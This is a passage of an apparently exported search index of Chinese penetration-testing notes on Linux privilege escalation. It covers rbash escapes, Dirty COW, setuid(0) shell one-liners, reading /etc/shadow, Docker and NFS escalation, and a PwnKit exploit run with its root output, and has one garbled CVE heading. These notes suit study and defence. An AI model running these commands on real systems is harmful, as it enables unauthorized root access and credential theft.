\u6267\u884c\u4e0a\u9762\u4e24\u4e2a\u8bed\u53e5\uff0c\u5c31bypass\u4e86 find bypasss \u7b80\u5355\u6982\u62ec\u5c31\u662f-exec\u6267\u884c\u4e00\u4e0b/bin/bash \u2026 \u7f16\u7a0b\u8bed\u8a00 bypass python \u5982\u679cpython\u90fd\u53ef\u4ee5\u7528\u7684\u8bdd\uff0c\u90a3\u5c31\u66f4\u8f7b\u677e\u4e86\uff0cos\u5b89\u6392\u4e00\u4e0b \u4f3c\u4e4epty\u4e5f\u884c?\u6ca1\u8bd5 python -c \"import os;os.system('/bin/bash')\" php php -a \u8fdb\u5165php shell \u7136\u540e\u6267\u884c\u547d\u4ee4:exec(\"/bin/bash\"); perl perl -e 'exec \"/bin/sh\";' ruby ruby -e 'exec \"/bin/bash\"' cp bypass \u76f4\u63a5\u7528cp\u628a/usr/bin\u91cc\u7684\u547d\u4ee4\u590d\u5236\u8fc7\u6765\u5c31\u884c\u4e86 \u76f4\u63a5\u66f4\u6539PATH/SHELL\u53d8\u91cf \u952e\u5165export -p \u67e5\u770b\u8be5\u7528\u6237\u7684\u53d8\u91cf \u5982\u679c\u8fd9\u4fe9\u53d8\u91cf\u6709w\u6743\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5199\u5165\u6765bypass ssh bypass \u539f\u7406\u662f\u901a\u8fc7ssh\u94fe\u63a5\u5f53\u524dIP\u7684\u5f53\u524d\u7528\u6237\u5e76\u542f\u52a8/bin/bash ssh username@Ip -t \"/bin/bash\" \u5185\u6838\u63d0\u6743 \u7528 uanme -a \u67e5\u660e\u5185\u6838\u7248\u672c uname\u6bd4\u8f83\u770b\u4e0d\u61c2\uff0c\u53ef\u4ee5\u7528lsb_release -a \u7136\u540e\u627eexp\u6253\u5c31\u5b8c\u4e8b\u4e86\uff0c\u5185\u6838\u63d0\u6743\u7684\u5185\u5bb9\u6709\u70b9\u5e95\u5c42\uff0c\u6682\u65f6\u4e0d\u7528\u6df1\u5165\u4e86\u89e3 \u810f\u725b \u67e5\u770b\u5185\u6838\u7248\u672c:uname -r 2.6.22<kernel version<4.8.3\u30014.7.9\u548c4.4.26 exp https://github.com/firefart/dirtycow.git Compile with: gcc -pthread dirty.c -o dirty -lcrypt Then run the newly create binary by either doing: ./dirty or ./dirty my-new-password Afterwards, you can either su firefart or ssh firefart@... DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT! mv /tmp/passwd.bak /etc/passwd Exploit adopted by Christian \"FireFart\" Mehlmauer cve-cve-2023-cve-2023-35001 v3.13-rc1 <= Linux Kernel < v6.5-rc2 \u7b49exp passwd\u548cshadow \u660e\u6587\u5bc6\u7801 /etc/passwd \u9ed8\u8ba4\u6240\u6709\u7528\u6237\u53ef\u8bfb\uff0c\u4f46\u53ea\u6709root\u53ef\u5199\u3002 /etc/passwd\u91cc\u7684\u7528\u6237\u53e3\u4ee4\u5f80\u5f80\u4ee5x\u4ee3\u66ff\uff0c\u5176\u52a0\u5bc6\u540e\u7684\u5bc6\u7801\u4f1a\u5b58\u5165/etc/shadow\u91cc\u9762\uff0c/etc/shadow\u9ed8\u8ba4\u53ea\u6709root\u53ef\u8bfb\u3002 \u4f46\u662f\u6709\u5c0f\u6982\u7387\u60c5\u51b5\uff0c\u660e\u6587\u5bc6\u7801\u5c31\u76f4\u63a5\u51fa\u73b0\u5728/etc/passwd\u4e86\uff0c\u5982\u679c\u6709\u8fd9\u4e2a\u60c5\u51b5\u4e14root\u5bc6\u7801\u66b4\u9732\u5728\u4e86passwd\u91cc\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8f7b\u800c\u6613\u4e3e\u63d0\u6743\u4e86 passwd \u53ef\u5199 \u5982\u679c/etc/passwd \u6211\u4eec\u5f53\u524d\u7528\u6237\u53ef\u5199\uff0c\u53ef\u4ee5\u76f4\u63a5\u628aroot\u7684\u5bc6\u7801\u6539\u6210\u4e00\u4e2a\u660e\u6587\u5bc6\u7801\uff0c\u4ece\u800c\u8fbe\u5230\u63d0\u6743\u76ee\u7684 \u7206\u7834shadow \u5982\u679c/etc/shadow \u53ef\u8bfb\uff0c\u6211\u4eec\u53ef\u4ee5\u7528hashcat\u6216\u8005john\u66b4\u529b\u7834\u89e3shadow\u6587\u4ef6 \u8ba1\u5212\u4efb\u52a1 \u6587\u4ef6\u91cd\u5199 \u8ba1\u5212\u4efb\u52a1\u7531crontab\u7ba1\u7406\uff0c\u975eroot\u7528\u6237\u662f\u65e0\u6cd5\u5217\u51faroot\u7528\u6237\u7684\u8ba1\u5212\u4efb\u52a1\u7684\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u5217\u51fa/etc\u7684\u7cfb\u7edf\u4efb\u52a1\uff0c\u7cfb\u7edf\u4efb\u52a1\u9ed8\u8ba4\u662froot\u6743\u9650\u8fd0\u884c\u7684 ls -l /etc/cron* \u5982\u679c\u6211\u4eec\u6709\u5e78\u6709\u6743\u9650\u80fd\u66f4\u6539\u5176\u4e2d\u4e00\u4e2a\u4efb\u52a1\u6307\u5b9a\u7684\u811a\u672c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f80\u811a\u672c\u91cc\u6dfb\u52a0\u5982\u53cd\u5f39shell\u7b49\u6307\u4ee4\uff0c\u4ece\u800c\u63d0\u6743 \u73af\u5883\u53d8\u91cf\u52ab\u6301 \u6211\u4eec\u67e5\u770b\u5b9a\u65f6\u4efb\u52a1 \u53d1\u73b0\u5b9a\u4e49\u4e86\u8bf8\u591a\u73af\u5883\u53d8\u91cf\uff0c\u5982\u679c\u5176\u4efb\u52a1\u6709\u672a\u6307\u5b9a\u7edd\u5bf9\u8def\u5f84\u7684\u6307\u4ee4\uff0c\u5982 17 * * * * root shell.sh \u800c\u4e14\u6211\u4eec\u5728\u5176\u73af\u5883\u53d8\u91cf\u8def\u5f84\u4e2d\u53ef\u4ee5\u8fdb\u884c\u5199\u5165\u64cd\u4f5c\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5199\u5165\u73af\u5883\u53d8\u91cf\u7684\u9760\u524d\u8def\u5f84\u4e00\u4e2a\u540c\u540d\u6076\u610f\u6587\u4ef6\u4ece\u800c\u5bfc\u81f4\u73af\u5883\u53d8\u91cf\u52ab\u6301 \u6bd4\u5982\u6211\u4eec\u5728/sbin \u5199\u5165\u4e00\u4e2a \u53cd\u5f39shell\u529f\u80fd\u7684shell.sh\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u9020\u6210\u63d0\u6743 \u901a\u914d\u7b26\u63d0\u6743 https://www.secpulse.com/archives/72965.html \u603b\u7ed3\u7684\u592a\u597d\u4e86\uff0c\u6211\u90fd\u4e0d\u60f3\u8bb0\u7b14\u8bb0\u4e86\uff08\u5077\u61d2 \u73af\u5883\u53d8\u91cf \u5982\u679c\u6211\u4eec\u627e\u5230\u4e00\u4e2asuid\u6743\u9650\u7684\u7a0b\u5e8f\uff0c\u4f46\u662f\u6211\u4eec\u65e0\u6cd5\u5b8c\u6210suid\u63d0\u6743\uff0c\u5c31\u53ef\u4ee5\u8bd5\u8bd5\u642d\u914d\u73af\u5883\u53d8\u91cf\u8fdb\u884c\u63d0\u6743\u3002 \u8fd9\u4e2a\u63d0\u6743\u65b9\u6cd5\u7684\u601d\u60f3\u662f\uff0c\u627e\u5230\u6709suid\u7684\uff0c\u5185\u90e8\u6709system\u51fd\u6570\u8c03\u7528\u672a\u6307\u5b9a\u8def\u5f84\u7684\u547d\u4ee4\u7684\u6587\u4ef6\u3002\u540c\u65f6\u7528\u6237\u6709\u4fee\u6539\u81ea\u5df1\u73af\u5883\u53d8\u91cf\u7684\u6743\u9650\uff0c \u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301system\u51fd\u6570\u91cc\u8c03\u7528\u7684\u811a\u672c\u6587\u4ef6\uff0c\u4f7f\u5176\u6307\u5411\u6211\u4eec\u73af\u5883\u53d8\u91cf\u91cc\u81ea\u884c\u521b\u5efa\u7684\u4e00\u4e2a\u540c\u540d\u811a\u672c\u6587\u4ef6\uff0c\u90a3\u4e48\u8fd9\u4e2a\u6211\u4eec\u81ea\u884c\u521b\u5efa\u7684\u540c\u540d\u811a\u672c\u6587\u4ef6\u5c31\u80fd\u4ee5root\u6743\u9650\u8fd0\u884c\u4e86\uff0c\u5982\u679c\u8fd9\u4e2a\u811a\u672c\u6587\u4ef6\u91cc\u7684\u547d\u4ee4\u662f/bin/bash\uff0c\u90a3\u4e48\u5c31\u76f8\u5f53\u4e8e\u6211\u4eec\u63d0\u6743\u4e86\u3002 \u53ef\u80fd\u6709\u70b9\u5c0f\u7ed5\uff0c\u770b\u4e0b\u9762\u5177\u4f53\u64cd\u4f5c\u5c31\u884c\u4e86\u3002 \u5b9e\u9a8c\u5ba4\u914d\u7f6e: \u9996\u5148\u5728\u4e00\u4e2a\u76ee\u5f55\u4e0b\u521b\u5efa\u5982\u4e0b\u6587\u4ef6 vim demo.c \u7136\u540e gcc demo.c -o shell \u5c06\u5176\u7f16\u8bd1\u4e3a\u53ef\u6267\u884c\u6587\u4ef6 \u7136\u540e chmod u+s shell \u4e3a\u5176\u589e\u52a0suid\u6743\u9650 \u653b\u51fb\u8005\u89c6\u89d2: \u9996\u5148\u4f7f\u7528\u4e0b\u5217\u6307\u4ee4\u641c\u5bfbsuid\u6743\u9650\u6587\u4ef6 find / -perm -u=s -type f 2>/dev/null \u53d1\u73b0\u53ef\u7591\u76ee\u6807\uff0c\u6267\u884c\u4e00\u4e0b\u770b\u770b \u53d1\u73b0\u8fd4\u56de\u4e86ps\u547d\u4ee4\u7684\u7ed3\u679c\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee5\u6b64\u731c\u6d4b\u8fd9\u4e2a\u6587\u4ef6\u5185\u90e8 \u6709 system(\"ps\"); \u8fd9\u6761c\u8bed\u8a00\u4ee3\u7801\u3002 \u9042\u53ef\u5c1d\u8bd5\u73af\u5883\u53d8\u91cf\u63d0\u6743 \u6211\u4eec\u4f9d\u6b21\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4 cd /tmp echo \"/bin/bash\" > ps export $PATH=/tmp:$PATH \u9700\u8981\u4fee\u6539\u81ea\u8eab\u73af\u5883\u53d8\u91cf\u7684\u6743\u9650\uff0c\u4f46\u57fa\u672c\u4e0a\u90fd\u6709\u8fd9\u4e2a\u6743\u9650 chmod 777 ./ps \u6ca1\u8fd9\u6761\u547d\u4ee4\u4f1a\u5bfc\u81f4\u63d0\u6743\u5931\u8d25 cd /home/const27 ./shell \u63d0\u6743\u6210\u529f \u5bc6\u7801\u67e5\u627e \u8fd9\u4e2a\u63d0\u6743\u6280\u672f\u8bf4\u767d\u4e86\uff0c\u5c31\u662f\u53bb\u5230\u5904\u7ffb\u5bc6\u7801 \u6587\u4ef6\u5185\u67e5\u627e grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2> /dev/null find . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \\; \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0a\u547d\u4ee4\uff0c\u6307\u5b9a\u5173\u952e\u5b57\uff0c\u5728\u6240\u6709\u6587\u4ef6\u4e2d\u641c\u7d22\u5185\u5bb9\u4e2d\u6709\u5173\u952e\u5b57\u7684\u6587\u4ef6\u3002 \u67e5\u627e\u5341\u5206\u949f\u5185\u66f4\u6539\u8fc7\u7684\u6587\u4ef6 find / -mmin -10 2>/dev/null | grep -Ev \"^/proc\" (\u4e0d\u663e\u793a^/proc\u6587\u4ef6\u6216\u6587\u4ef6\u5939) capabilities capabilities \u662flinux2.2\u540e\u51fa\u73b0\u7684\u4ea7\u7269\uff0c\u5b83\u7684\u51fa\u73b0\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u5f25\u8865\u4e86suid\u8fd9\u79cd\u7c97\u7cd9\u7684\u6743\u9650\u7ba1\u7406\u673a\u5236\uff0c\u4f46\u662fcapabilities \u81ea\u8eab\u4e5f\u6709\u9020\u6210\u63d0\u6743\u7684\u5b89\u5168\u9690\u60a3 \u7b80\u4ecb capabilities \u628aroot\u7684\u6743\u9650\u7ec6\u5206\u4e86\uff0c\u53ef\u4ee5\u5206\u522b\u542f\u7528\u6216\u8005\u7981\u7528\u3002 \u5728\u8fdb\u884c\u7279\u6743\u64cd\u4f5c\u7684\u65f6\u5019\uff0c\u5982\u679ceuid\u4e0d\u662froot\uff0c\u90a3\u4e48\u7cfb\u7edf\u5c31\u4f1a\u68c0\u67e5\u662f\u5426\u5177\u6709\u6267\u884c\u7279\u6743\u64cd\u4f5c\u7684\u5bf9\u5e94capabilities \uff0c\u5e76\u4ee5\u6b64\u4e3a\u51ed\u636e\u51b3\u5b9a\u7279\u6743\u64cd\u4f5c\u662f\u5426\u80fd\u88ab\u6267\u884c\u3002 \u5982\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u7279\u6743\u64cd\u4f5c\u53ca\u5176\u5bf9\u5e94capabilities \u6539\u53d8\u6587\u4ef6\u7684\u6240\u5c5e\u8005(chown()) CAP_CHOWN \u5411\u8fdb\u7a0b\u53d1\u9001\u4fe1\u53f7(kill(), signal()) CAP_KILL \u6539\u53d8\u8fdb\u7a0b\u7684uid(setuid(), setreuid(), setresuid()\u7b49) CAP_SETUID trace\u8fdb\u7a0b(ptrace()) CAP_SYS_PTRACE \u8bbe\u7f6e\u7cfb\u7edf\u65f6\u95f4(settimeofday(), stime()\u7b49) CAP_SYS_TIME \u5ffd\u7565\u6587\u4ef6\u8bfb\u53ca\u76ee\u5f55\u641c\u7d22\u7684DAC\u8bbf\u95ee\u9650\u5236 CAP_DAC_READ_SEARCH \u5173\u4e8ecapabilities\u7684\u7ba1\u7406\u5de5\u5177\u6709\u5982\u4e0b: getcap setcap capsh filecap getcap \u7528\u4e8e\u67e5\u8be2capabilities\uff0csetcap\u7528\u4e8e\u8bbe\u7f6ecapabilities\uff0ccapsh\u7528\u4e8e\u67e5\u5f53\u524dshell\u8fdb\u7a0b\u7684capabilities\uff0cfilecap\u65e2\u80fd\u8bbe\u7f6e\u53c8\u80fd\u67e5\u8be2\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u6307\u4ee4\u641c\u7d22\u8bbe\u7f6e\u4e86capabilities\u7684\u53ef\u6267\u884c\u6587\u4ef6 getcap -r / 2>/dev/null \u5b9e\u64cd \u901a\u8fc7cap_setuid cap_setuid \u53ef\u4ee5\u8bbe\u7f6e\u5f53\u524d\u7528\u6237\u7684euid\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6b64\u9009\u9879\u6765\u8fdb\u884c\u4e00\u4e9b\u63d0\u6743\u3002 \u4ee5python\u4e3a\u4f8b \u6211\u4eec\u53d1\u73b0python3.8 \u6709cap_setuid\u6743\u9650\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u7528\u4ee5\u4e0b\u6307\u4ee4\u8fdb\u884c\u63d0\u6743 python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' \u7c7b\u4f3c\u7684\u6709\u5f88\u591a\u3002 perl perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";' gdb gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit php php -r \"posix_setuid(0); system('/bin/sh');\" python python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' rvim \u9700\u8981\u652f\u6301python3\u6a21\u5757\u3002 rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' vim \u9700\u8981\u652f\u6301python3\u6a21\u5757\u3002 vim --version \u67e5\u8be2\uff0c\u662f\u5426\u652f\u6301py3 vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' \u901a\u8fc7CAP_DAC_READ_SEARCH cap_dac_read_search\u53ef\u4ee5\u7ed5\u8fc7\u6587\u4ef6\u7684\u8bfb\u6743\u9650\u68c0\u67e5\u4ee5\u53ca\u76ee\u5f55\u7684\u8bfb/\u6267\u884c\u6743\u9650\u7684\u68c0\u67e5\u3002 \u5229\u7528\u6b64\u7279\u6027\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u7cfb\u7edf\u4e2d\u7684\u654f\u611f\u4fe1\u606f\u3002 \u5982\u679ctar\u6709\u6b64\u6743\u9650\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6b64\u6765\u67e5\u770b\u654f\u611f\u6587\u4ef6\u5185\u5bb9\u3002 tar cvf shadow.tar /etc/shadow //\u521b\u5efa\u538b\u7f29\u6587\u4ef6 tar -xvf shadow.tar //\u89e3\u538b\u7f29 cd etc //\u8fdb\u5165\u89e3\u538b\u7f29\u7684\u76ee\u5f55 chmod +r shadow //\u8d4b\u4e88\u8bfb\u6743\u9650 cat shadow | grep root //\u67e5\u770bshadow\u6587\u4ef6\u7684\u5185\u5bb9 Docker Docker\u7528\u6237\u7ec4\u63d0\u6743 \u5982\u679c\u6211\u4eec\u62ff\u5230\u4e86\u4e00\u4e2aDocker\u7528\u6237\u7ec4\u7684\u7528\u6237\u6743\u9650\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5f88\u8f7b\u677e\u5730\u5b8c\u6210\u63d0\u6743 \u9996\u5148\u6211\u4eec\u6267\u884c\u5982\u4e0b\u547d\u4ee4 docker run -v /:/mnt --rm -it crf_web1 chroot /mnt sh \u7136\u540e\u5728\u5176\u4e2d\u7684/etc/passwd\u4e2d\u5199\u5165\u4e00\u4e2aroot\u6743\u9650\u7528\u6237\uff08\u6211\u8fd9\u91cc\u76f4\u63a5\u65e0\u5bc6\u7801\u4e86\uff09 \u7136\u540e\u9000\u51fa\u6765\uff0c\u76f4\u63a5\u5c1d\u8bd5 su root2 \u63d0\u6743\u6210\u529f NFS NFS \u662f\u4e00\u4e2a\u7528\u6765\u5171\u4eab\u76ee\u5f55\u7684\u4e1c\u897f\uff0c\u4f46\u82e5\u914d\u7f6e\u6743\u9650\u4e0d\u5f53\u5219\u4f1a\u5f15\u53d1\u5b89\u5168\u95ee\u9898 no_root_squash \u6211\u4eeccat /etc/exports \u5982\u679c\u6709no_root_squash\u5b57\u6837\uff0c\u5219\u8bf4\u660eroot\u7528\u6237\u5c31\u4f1a\u5bf9\u5171\u4eab\u76ee\u5f55\u62e5\u6709\u81f3\u9ad8\u7684\u6743\u9650\u63a7\u5236\uff0c\u5c31\u50cf\u662f\u5bf9\u672c\u673a\u7684\u76ee\u5f55\u64cd\u4f5c\u4e00\u6837\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c\u4efb\u4f55\u673a\u5668\u7684root\u5728\u6b64\u76ee\u5f55\u4e0a\u90fd\u6709\u6700\u9ad8\u6743\u9650\u3002 \u6211\u4eec\u5728\u83b7\u5f97\u4e00\u53f0\u673a\u5668\u7684root\u6743\u9650\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7nfs\u5728\u53e6\u4e00\u53f0\u4f4e\u6743\u9650\u673a\u5668\u4e0a\u5b9e\u73b0\u63d0\u6743 mkdir /tmp/nfs mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs \u5c06\u672c\u673a\u4e0a\u7684/tmp/nfs \u6302\u8f7d\u5230\u5171\u4eab\u76ee\u5f55 cp /bin/bash /tmp/nfs/bash chmod u+s /tmp/nfs/bash \u8bbe\u7f6e\u5171\u4eab\u76ee\u5f55\u4e0abash\u7684suid \u56de\u5230\u4f4e\u6743\u9650\u673a\uff0c\u6267\u884c /tmp/bash \u5b8c\u6210\u63d0\u6743 pkexec \u63d0\u6743CVE-2021-4034 polkit\u662f\u4e00\u4e2a\u6388\u6743\u7ba1\u7406\u5668\uff0c\u5176\u7cfb\u7edf\u67b6\u6784\u7531\u6388\u6743\u548c\u8eab\u4efd\u9a8c\u8bc1\u4ee3\u7406\u7ec4\u6210\uff0cpkexec\u662f\u5176\u4e2dpolkit\u7684\u5176\u4e2d\u4e00\u4e2a\u5de5\u5177\uff0c\u4ed6\u7684\u4f5c\u7528\u6709\u70b9\u7c7b\u4f3c\u4e8esudo\uff0c\u5141\u8bb8\u7528\u6237\u4ee5\u53e6\u4e00\u4e2a\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4 https://github.com/luijait/PwnKit-Exploit.git debian@debian:~/PwnKit-Exploit$ make cc -Wall exploit.c -o exploit debian@debian:~/PwnKit-Exploit$ whoami debian debian@debian:~/PwnKit-Exploit$ ./exploit Current User before execute exploit hacker@victim$whoami: debian Exploit written by @luijait (0x6c75696a616974) [+] Enjoy your root if exploit was completed succesfully root@debian:/home/debian/PwnKit-Exploit# whoami root root@debian:/home/debian/PwnKit-Exploit# \u4e0d\u53d7\u5f71\u54cd\u7684\u7248\u672c CentOS\uff1a \u00b7 CentOS 6\uff1apolkit-0.96-11.el6_10.2 \u00b7 CentOS 7\uff1apolkit-0.112-26.el7_9.1 \u00b7 CentOS 8.0\uff1apolkit-0.115-13.el8_5.1 \u00b7 CentOS 8.2\uff1apolkit-0.115-11.el8_2.2 \u00b7 CentOS 8.4\uff1apolkit-0.115-11.el8_4.2 Ubuntu\uff1a \u00b7 Ubuntu 14.04 ESM\uff1apolicykit-1-0.105-4ubuntu3.14.04.6+esm1 \u00b7 Ubuntu 16.04 ESM\uff1apolicykit-1-0.105-14.1ubuntu0.5+esm1 \u00b7 Ubuntu 18.04 LTS\uff1apolicykit-1-0.105-20ubuntu0.18.04.6 \u00b7 Ubuntu 20.04 LTS\uff1apolicykit-1-0.105-26ubuntu1.2 \u00b7 Ubuntu 21.10\uff1apolicykit-1-0.105-31ubuntu0.1 Debain\uff1a \u00b7 \uff1apolicykit-1 0.105-18+deb9u2 \u00b7 Debain stretch\uff1apolicykit-1 0.105-18+deb9u2 \u00b7 Debain buster\uff1apolicykit-1 0.105-25+deb10u1 \u00b7 Debain bullseye\uff1apolicykit-1 0.105-31+deb11u1 \u00b7 Debain bookworm,bullseye\uff1apolicykit-1 0.105-31.1","title":"Linux\u63d0\u6743\u603b\u7ed3"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#linux","text":"","title":"Linux\u63d0\u6743\u603b\u7ed3"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_1","text":"sudo \u548c suid \u63d0\u6743 \u53ef\u5229\u7528\u547d\u4ee4\u6e05\u5355 \u4f55\u4e3asuid \u4f55\u4e3asudo \u904d\u5386\u76ee\u5f55\u4e2d\u7684suid\u6587\u4ef6 \u7528sudo -l \u67e5\u770b\u54ea\u4e9b\u547d\u4ee4\u80fd\u88absudo \u53ef\u5229\u7528\u4e8e\u63d0\u6743\u7684\u547d\u4ee4 1.nmap 2.find 3.vim 4.bash 5.less\uff0cmore 6.exim rbash \u7ed5\u8fc7 \u4f55\u4e3arbash bypass scp bypass \u8fdb\u5165\u547d\u4ee4\u81ea\u5e26shell bypass find bypasss \u7f16\u7a0b\u8bed\u8a00 bypass cp bypass \u76f4\u63a5\u66f4\u6539PATH/SHELL\u53d8\u91cf ssh bypass \u5185\u6838\u63d0\u6743 \u810f\u725b cve-cve-2023-cve-2023-35001 passwd\u548cshadow \u660e\u6587\u5bc6\u7801 passwd \u53ef\u5199 \u7206\u7834shadow \u8ba1\u5212\u4efb\u52a1 \u6587\u4ef6\u91cd\u5199 \u73af\u5883\u53d8\u91cf\u52ab\u6301 \u901a\u914d\u7b26\u63d0\u6743 \u73af\u5883\u53d8\u91cf \u5bc6\u7801\u67e5\u627e \u6587\u4ef6\u5185\u67e5\u627e \u67e5\u627e\u5341\u5206\u949f\u5185\u66f4\u6539\u8fc7\u7684\u6587\u4ef6 capabilities \u7b80\u4ecb \u5b9e\u64cd \u901a\u8fc7cap_setuid \u901a\u8fc7CAP_DAC_READ_SEARCH Docker Docker\u7528\u6237\u7ec4\u63d0\u6743 NFS no_root_squash pkexec \u63d0\u6743CVE-2021-4034","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#sudo-suid","text":"","title":"sudo \u548c suid \u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_2","text":"https://gtfobins.github.io//","title":"\u53ef\u5229\u7528\u547d\u4ee4\u6e05\u5355"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#suid","text":"\u53ef\u89c1\u5728\u6743\u9650\u4f4d\u7f6e\u6709\u4e00\u4e2as\u6743\u9650\u3002\u90a3\u4e48\u8fd9\u4e2as\u7684\u4f5c\u7528\u662f\u4ec0\u4e48\u5462\uff1f \u7b54\u6848\u662f\u5f53\u5176\u4ed6\u7528\u6237\u6267\u884c\u8be5\u6587\u4ef6\u65f6\uff0c\u8be5\u6587\u4ef6\u4f1a\u4ee5root\u7684\u8eab\u4efd\u6267\u884c\u3002 \u8fd9\u91cc\u5c31\u6d89\u53ca\u5230\u4e86Effective UID\u548cReal UID\u4ee5\u53caSaved UID Effective UID: \u7a0b\u5e8f\u5b9e\u9645\u64cd\u4f5c\u65f6\u751f\u6548\u7684UID Real UID: \u6267\u884c\u8be5\u7a0b\u5e8f\u7684\u7528\u6237\u7684\u5b9e\u9645UID Saved UID: \u5728\u9ad8\u6743\u9650\u7528\u6237\u964d\u6743\u540e\uff0c\u4fdd\u7559\u7684\u5176\u539f\u672cUID (\u4e0d\u5c55\u5f00\u8bf4) \u6240\u4ee5\u589e\u52a0\u4e86\u4e00\u4e2as\u6743\u9650\uff0c\u8be5\u7a0b\u5e8f\u5728\u5b9e\u9645\u8fd0\u884c\u65f6Effective UID\u5c31\u4f1a\u53d8\u4e3a0\uff0c\u5373root\u7684UID","title":"\u4f55\u4e3asuid"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#sudo","text":"\u5c31\u662f\u80fd\u628a\u4e00\u4e2a\u547d\u4ee4\u89c6\u4f5croot\u6765\u6267\u884c,\u7528sudo-l\u67e5\u770b\u53ef\u4ee5\u88absudo\u7684\u547d\u4ee4","title":"\u4f55\u4e3asudo"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#suid_1","text":"find / -perm -u=s 2>/dev/null \u6267\u884c\u8be5\u547d\u4ee4\uff0c\u4f1a\u5f97\u5230\u6240\u6709suid\u6587\u4ef6","title":"\u904d\u5386\u76ee\u5f55\u4e2d\u7684suid\u6587\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#sudo-l-sudo","text":"","title":"\u7528sudo -l 